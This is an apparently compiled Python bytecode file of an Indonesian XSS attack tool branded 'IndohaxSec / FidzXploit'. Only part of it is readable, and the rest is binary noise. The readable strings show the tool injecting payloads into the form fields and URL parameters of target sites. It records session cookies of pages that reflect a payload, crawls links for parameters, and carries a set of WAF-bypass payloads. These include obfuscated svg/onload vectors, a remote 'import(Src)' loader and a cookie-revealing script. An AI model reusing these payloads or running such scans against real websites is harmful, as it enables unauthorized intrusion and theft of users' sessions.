�
    �>�gR,  �                   �z   � d dl Z d dlmZ d dlmZmZmZmZ d dlZd dl	Z	d� Z
d
d�Zd� Zd� Zd� Zed	k(  r e�        yy)�    N)�BeautifulSoup)�urljoin�	urlencode�urlparse�parse_qsc                  ��   � t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d	�       t        d
�       t        d�       y )Nz[92mz> ____  _  _  ____  _____  _   _    __    _  _  ___  ____  ___ z>(_  _)( \( )(  _ \(  _  )( )_( )  /__\  ( \/ )/ __)( ___)/ __)z> _)(_  )  (  )(_) ))(_)(  ) _ (  /(__)\  )  ( \__ \ )__)( (__ z?(____)(_)\_)(____/(_____)(_) (_)(__)(__)(_/\_)(___/(____)\___) z> _  _  ___  ___    ___   ___    __    _  _                    z>( \/ )/ __)/ __)  / __) / __)  /__\  ( \( )                   z= )  ( \__ \__ \  \__ \( (__  /(__)\  )  (                    z>(_/\_)(___/(___/  (___/ \___)(__)(__)(_)\_)                   z1Author by FidzXploit | copyright @2k25 january 23�[0m)�print� �    �xss.py�openingr      sc   � �	�*��	�
K�L�	�
K�L�	�
K�L�	�
L�M�	�
K�L�	�
K�L�	�
J�K�	�
K�L�	�
>�?�	�)�r   c           
      �r  � t        d�       t        d�       t        d�       	 t        j                  | d��      }|j                  �        t	        |j
                  d�      }|j                  ddg�      }g }|D ]�  }|j                  d�      }|s�|D ]h  }	t        ||	i�      }
| � d	|
� �}t        j                  |d��      }|	|j
                  v s�=|j                  ||j                  j                  �       d
��       �j �� t        | �      }t        |j                  �      }|j                  �       D ]�  }|D ]�  }	|j                  � d|j                   � |j"                  � d	|� d|	� �}t        j                  |d��      }|	|j
                  v s�V|j                  ||j                  j                  �       d
��       �� �� |r>|r0t        d�       |D ]  }t        d|d   � d��       t        d�       �! yt        d�       y|r�t%        dd�      5 }|D ]1  }|j'                  |d   � d��       |j'                  d|d   � d��       �3 	 ddd�       t        d�       |D ]%  }t        d|d   � ��       t        d|d   � d��       �' yt        d�       y# 1 sw Y   �KxY w# t(        $ r}t        d|� d��       Y d}~yd}~ww xY w)z?Melakukan analisis XSS pada URL dengan payloads yang diberikan.�8[94m-----------------------------------------------[0mz-[94m IndohaxSec XSS Tools by FidzXploit [0m�
   ��timeout�html.parser�input�textarea�name�?)�url�cookiesz://�=z[92mValidasi Popup:[0mz[93mURL Rentan: r   r	   z.[92mPayload berhasil menghasilkan popup![0m
z>[91mTidak ditemukan kerentanan XSS dengan validasi popup.[0mzhasil_xss.txt�w�
z	Cookies: r   �

Nz+[92mHasil disimpan di 'hasil_xss.txt'.[0m�URL: z([91mTidak ditemukan kerentanan XSS.[0m�[91mTerjadi kesalahan: )r
   �requests�get�raise_for_statusr   �text�find_allr   �appendr   �get_dictr   r   �query�keys�scheme�netloc�path�open�write�	Exception)r   �payloads�
mode_popup�response�soup�input_fields�results�field�
field_name�payload�encoded_payload�url_vulnerable�response_vulnerable�
parsed_url�query_params�key�result�f�es                      r   �analisis_xssrB      s�  � �	�
J�K�	�
?�@�	�
J�K�78��<�<��R�0���!�!�#��X�]�]�M�:���}�}�g�z�%:�;����!�E����6�*�J��'�G�&/��W�0E�&F�O�(+�u�A�o�->�%?�N�*2�,�,�~�r�*R�'��"5�":�":�:����#1�':�'B�'B�'K�'K�'M�(� �  (� "� �c�]�
��
� 0� 0�1���$�$�&�C�#��$.�$5�$5�#6�c�*�:K�:K�9L�Z�_�_�L]�]^�_b�^c�cd�el�dm�!n��&.�l�l�>�2�&N�#��1�6�6�6��N�N�-�#6�#>�#>�#G�#G�#I�$� �	 $� '� ���6�7�%�F��0�����w�G�H��Q�R� &� �\�]���/�3�/�1�")�����6�%�=�/�� 4�5����)�F�9�,=�+>�d� C�D� #*� 0� �I�J�%�F��E�&��-��1�2��I�f�Y�&7�%8��;�<� &� �F�G� 0�/�� � 8��+�A�3�g�6�7�7��8�sV   �A*J �>J �B:J �A#J �,J �8J �7J�>=J �<J �J�J �	J6�J1�1J6c                 �  � t        d�       t        d�       t        d�       	 t        j                  | d��      }|j                  �        t	        |j
                  d�      }|j                  dd��      }i }|D ]R  }|d	   }t        | |�      }t        |�      }t        |j                  �      }	|	s�7t        |	j                  �       �      ||<   �T |r�t        d
d�      5 }
|j                  �       D ]>  \  } }|
j                  d| � d��       |
j                  ddj!                  |�      � d��       �@ 	 ddd�       t        d�       |j                  �       D ]1  \  } }t        d| � ��       t        ddj!                  |�      � d��       �3 yt        d�       y# 1 sw Y   �exY w# t"        $ r}t        d|� d��       Y d}~yd}~ww xY w)z"Mencari parameter dari URL target.r   z*[94m Temukan Parameter by IndohaxSec [0mr   r   r   �aT)�hrefrE   zparameter.txtr   r   r   zParameters: z, r   Nz=[92mParameter ditemukan dan disimpan di 'parameter.txt'.[0mz,[91mTidak ditemukan parameter pada URL.[0mr    r	   )r
   r!   r"   r#   r   r$   r%   r   r   r   r(   �listr)   r-   �itemsr.   �joinr/   )r   r2   r3   �links�
parameters�linkrE   �full_urlr<   r(   r@   �paramsrA   s                r   �temukan_parameterrN   S   s�  � �	�
J�K�	�
<�=�	�
J�K�8��<�<��R�0���!�!�#��X�]�]�M�:�����c���-���
��D���<�D��s�D�)�H�!�(�+�J��Z�-�-�.�E��'+�E�J�J�L�'9�
�8�$� � ��o�s�+�q�#-�#3�#3�#5�K�C���G�G�e�C�5��O�,��G�G�l�4�9�9�V�+<�*=�T�B�C� $6� ,� �W�X�)�/�/�1���V���c�U�m�$���T�Y�Y�v�%6�$7�r�:�;�  2� �F�G� ,�+�� � 8��+�A�3�g�6�7�7��8�s>   �B
F �.,F �AF�-AF �F �F�F �	F?�&F:�:F?c                 �B  � dgg d�g d�dgg d�d�}|j                  |g �      }|st        d�       yt        d	|� d
��       	 g }|D ]@  }| � d|� �}t        j                   |d��      }||j                  v s�0|j	                  |�       �B |rZt        dd�      5 }|D ]  }	|j                  |	� d��       � 	 ddd�       t        d�       t        d�       |D ]  }	t        |	�       � yt        d�       y# 1 sw Y   �>xY w# t        $ r}
t        d|
� d��       Y d}
~
yd}
~
ww xY w)z"Melakukan pemindaian XSS Anti-WAF.z';k='e'%0Atop['al'+k+'rt'](1)//)z'<svg/onload=window[\"al\"+\"ert\"]1337>z%<Img Src=OnXSS OnError=confirm(1337)>z,<Svg Only=1 OnLoad=confirm(document.domain)>z.<svg onload=alert&#0000000040document.cookie)>z;<sVG/oNLY%3d1//On+ONloaD%3dconfirm%26%23x28%3b%26%23x29%3b>z2%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E�(<Img Src=//X55.is OnLoad%0C=import(Src)>zG<Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==\"))>)z+'>\\'<details/open/ontoggle=confirm('XSS')>z.6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/z8';window/aabb/['al'%2b'ert'](document./aabb/location);//z2<svg onload='new Function[\"Y000!\"].find(alert)'>)rP   zF<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div>\">zy<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;> x)�1�2�3�4�5z[91mOpsi WAF tidak valid.[0mNz#[94mScanning menggunakan opsi WAF z...[0mz?test=r   r   zantiwaf.txtr   r   z)[92mHasil disimpan di 'antiwaf.txt'.[0mz[92mURL yang rentan:[0mz2[91mTidak ditemukan kerentanan pada opsi ini.[0mr    r	   )r"   r
   r!   r$   r&   r-   r.   r/   )r   �
waf_option�waf_payloadsr0   r5   r8   r:   r2   r@   r?   rA   s              r   �xss_scan_anti_wafrX   v   s;  � � 1�1�	
�
�
 D�D�
�%�L�2 ���
�B�/�H���4�5��	�2�:�,�j�
I�J�8����G� #�u�F�7�)�4�N��|�|�N�B�?�H��(�-�-�'����~�.�	  � ��m�S�)�Q�%�F��G�G�v�h�b�M�*� &� *� �C�D��3�4�!���f�� "� �K�L� *�)�� � 8��+�A�3�g�6�7�7��8�s<   �3C< �5!C< �C0�30C< �$C< �0C9�5C< �<	D�D�Dc                  �  � d} t        j                   d�      }t        j                  |j                  �       �      j	                  �       }|| k(  �r�t        �        	 t        d�       t        d�       t        d�       t        d�       t        d�       t        d	�       t        d
�       t        d�       t        d�      }|dk(  rt        d�      }ddg}t        ||�       �n:|dk(  r3t        d�      }t        d�      j                  d�      }t        ||�       �n|dk(  rt        d�      }dg}t        ||�       n�|dk(  rt        d�      }t        |�       n�|dk(  rt        d�      }dg}t        ||d��       n�|dk(  r�t        d�      }|j                  d�      st        d�       ��Jt        d�       t        d�       t        d�       t        d �       t        d!�       t        d"�       t        d#�      }t        ||�       n|d$k(  rt        d%�       y*t        d&�       t        d'�      j                  �       }|d(k7  rt        d%�       y*���t        d)�       y*)+zFungsi utama program.� 14b7e7c84a6758dd6c0695e973be1cd8zMasukkan password: Tz[93mPilih Mode:[0mz!1. Otomatis (payloads disediakan)z%2. Manual (masukkan payloads sendiri)z3. Payloads Spesialz4. Temukan Parameterz5. Validasi Popupz6. XSS Scan Anti WAFz	7. KeluarzPilih opsi (1/2/3/4/5/6/7): rQ   zMasukkan URL target: z<script>alert(1)</script>z <img src='x' onerror='alert(1)'>rR   z*Masukkan payloads (pisahkan dengan koma): �,rS   aB  "><script>var x = new Date();prompt(`XSS-By-IndoHaxSec

Domain :: ${document.domain}
ReadyState :: ${document.readyState}
Path :: ${location.pathname}
TextContent :: ${document.textContent}
AppName :: ${navigator.appName}
Pixel :: ${screen.pixelDepth}
Color :: ${screen.colorDepth}
Origin :: ${location.origin}
CodeName :: ${navigator.appCodeName}
Protocol :: ${location.protocol}
Date :: ${document.lastModified}
AvailWidth :: ${screen.availWidth}
AvailHeight :: ${screen.availHeight}

Cookies :: ${document.cookie},${x.getHours()}:${x.getMinutes()}:${x.getSeconds()})</script>rT   rU   z<script>alert('XSS')</script>)r1   �6)zhttp://zhttps://zI[91mURL tidak valid. Harus diawali dengan 'http://' atau 'https://'.[0mz[93mPilih jenis WAF:[0mz1. WAF Jenis 1z2. WAF Jenis 2z3. WAF Jenis 3z4. WAF Jenis 4z5. WAF Jenis 5zPilih opsi WAF (1/2/3/4/5): �7z[92mKeluar dari program.[0mz[91mOpsi tidak valid.[0mz'[93mKembali ke menu utama? (y/n): [0m�yz[91mPassword salah![0mN)�getpass�hashlib�md5�encode�	hexdigestr   r
   r   rB   �splitrN   �
startswithrX   �lower)�password_hash�input_password�input_password_hash�pilihan�
url_targetr0   rV   �lanjuts           r   �mainrm   �   s+  � �6�M��_�_�%:�;�N�!�+�+�n�&;�&;�&=�>�H�H�J���m�+��	���.�/��5�6��9�:��'�(��(�)��%�&��(�)��+���:�;�G��#�~�"�#:�;�
�7�9[�\���Z��2��C��"�#:�;�
� �!M�N�T�T�UX�Y���Z��2��C��"�#:�;�
� e	��� �Z��2��C��"�#:�;�
�!�*�-��C��"�#:�;�
�;�<���Z��d�C��C��"�#:�;�
�!�,�,�-D�E��k�l���7�8��&�'��&�'��&�'��&�'��&�'�"�#A�B�
�!�*�j�9��C���;�<���8�9��J�K�Q�Q�S�F���}��;�<��q �t 	�.�/r   �__main__)F)r!   �bs4r   �urllib.parser   r   r   r   r`   r_   r   rB   rN   rX   rm   �__name__r   r   r   �<module>rr      sI   �� � � ?� ?� � ��=8�~!8�F78�rC0�J �z���F� r   